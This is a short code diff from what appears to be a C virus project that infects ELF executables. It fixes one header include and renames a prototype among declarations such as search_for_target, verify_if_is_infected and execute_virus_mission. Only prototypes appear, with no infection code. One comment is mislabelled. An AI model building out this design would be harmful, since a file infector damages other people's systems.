@@ -16,7 +16,7 @@
 #include <fcntl.h>  //The <fcntl.h> header defines the following requests and arguments for use by the functions fcntl() and open().
 #include <unistd.h> //The <unistd.h> header defines miscellaneous symbolic constants and types, and declares miscellaneous functions.
 #include <sys/wait.h> //The <sys/wait.h> header shall define the symbolic constants for use with waitpid()
-#include <sys/time> //The <sys/stat.h> header shall define the structure of the data returned by the fstat(), lstat(), and stat() functions.
+#include <sys/time.h> //The <sys/stat.h> header shall define the structure of the data returned by the fstat(), lstat(), and stat() functions.
 #include <stdbool.h>
 
 
@@ -27,7 +27,7 @@ long what_is_the_file_length(char *file_name);
  * */
 int verify_is_elf(char *file_name);
 
-int verify_is_infected(char *file_name, char *virus_signature,int length_of_signature);
+int verify_if_is_infected(char *file_name, char *virus_signature,int length_of_signature);
 int verify_is_original_file(char * file_name); // do not infect oneself :)
 char *search_for_target(char *virus_signature, long length_of_signature);
 void execute_virus_mission();
